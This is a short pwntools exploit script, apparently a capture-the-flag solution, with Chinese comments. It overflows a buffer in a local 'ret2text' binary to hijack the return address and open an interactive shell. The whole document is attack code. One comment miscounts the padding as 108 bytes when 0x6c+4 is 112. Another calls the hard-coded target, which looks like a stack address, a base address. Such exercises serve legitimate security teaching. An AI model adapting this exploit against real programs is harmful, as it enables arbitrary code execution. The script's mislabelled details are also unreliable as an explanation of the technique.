##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0xffffd058 ## 基址
sh.sendline(b'A' * (0x6c + 4) + p32(target)) ## 会创建一个由 108 个字符 'A' 组成的字节串
sh.interactive() ## 进入互动模式，攻击者可以通过这个 shell 执行任意命令